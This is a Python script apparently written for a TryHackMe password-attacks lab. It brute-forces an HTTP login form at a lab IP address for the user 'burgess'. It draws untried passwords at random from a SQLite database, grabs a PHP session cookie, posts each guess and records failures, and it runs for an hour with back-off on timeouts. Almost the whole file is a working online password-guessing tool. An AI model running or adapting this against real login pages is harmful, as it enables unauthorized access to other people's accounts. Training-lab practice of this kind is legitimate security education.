#!/usr/bin/python3
# Written and tested for Python 3.10.9

"""
Used for TryHackMe's Password Attacks Room. The hydra command I used would not complete before the machine timed out.
So, I made a script, as seen here, which keeps track of attempted creds.
A wise coder would introduce threading, but I did not.
"""

# requests for http requests
import requests
# sqlite3 for sqlite interaction
import sqlite3
# time for timing
import time

# machine ip for target machine
machine_ip = '10.10.189.97'

# a connection to the db. The db has to exist.
conn = sqlite3.connect('http_creds.db')
cur = conn.cursor()

# I like to keep track of the count of creds not yet tried
result = cur.execute('SELECT COUNT(*) FROM creds WHERE TRIED= 0')
# results are returned as a tuple, the [0] gets the part I want
count = result.fetchone()[0]
# Print the count
print("Count is {}".format(str(count)))

# get the time now
start_time = time.time()
# establish running time
running_time = time.time() - start_time

# run for an hour (3600 seconds)
while running_time < 3600:
    r = ''
    running_time = time.time() - start_time
    result = cur.execute('SELECT COUNT(*) FROM creds WHERE TRIED= 0')
    count = result.fetchone()[0]
    print("{} to go".format(str(count)))
    url = "http://{}/login-post/".format(machine_ip)
    # Got the headers from a capture of Firefox interaction with the site
    # Changed upgrade insecure requests, Firefox says 1, but we know the site is HTTP only
    headers = {"Host": machine_ip,
               "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0",
               "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
               "Accept-Language": "en-US,en;q=0.5",
               "Accept-Encoding": "gzip, deflate",
               "Connection": "keep-alive",
               "Upgrade-Insecure-Requests": "0"}
    skip = False
    # try to get stuff
    try:
        r = requests.get(url, headers=headers, timeout=5)
    except requests.exceptions.ConnectTimeout:
        # wait if we get a timeout
        print("Timed out")
        time.sleep(60)
        # we cannot continue, so we will skip the rest
        skip = True
    except requests.exceptions.ConnectionError:
        print("Connection error")
        time.sleep(60)
        skip = True
    # If we are not skipping
    if skip is False:
        # PHP Session ID is here
        sessid = (r.headers["Set-Cookie"].split("=")[1].split(";")[0])
        url = "http://{}/login-post/index.php".format(machine_ip)
        # we get a random random password.
        sql = "SELECT * FROM creds WHERE TRIED = 0 ORDER BY RANDOM() LIMIT 1"
        result = cur.execute(sql)
        # username is given in the problem statement
        username = "burgess"
        password = result.fetchone()[1]
        print("password: {}".format(password))
        message = "username=burgess&password={}".format(password)
        headers = {
            "Host": machine_ip,
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "Content-Type": "application/x-www-form-urlencoded",
            "Content-Length": str(len(message)),
            "Origin": "http://{}".format(machine_ip),
            "Connection": "keep-alive",
            "Referer": "http://{}/login-post/".format(machine_ip),
            "Cookie": "PHPSESSID={}".format(sessid),
            "Upgrade-Insecure-Requests": str(0)}
        try:
            r = requests.post(url, headers=headers, data=message, timeout=5)
        except requests.exceptions.ConnectTimeout:
            print('timed out')
            time.sleep(60)
            skip = True
        except requests.exceptions.ConnectionError:
            print("Connection Error")
            time.sleep(60)
            skip = True
        if skip is False:
            if "Incorrect username or password." in r.text:
                update = cur.execute('UPDATE creds SET TRIED = 1 WHERE username = ? AND password = ?',
                                     ("burgess", password))
                conn.commit()
            else:
                print("This one: {}".format(password))
        else:
            pass
    else:
        pass
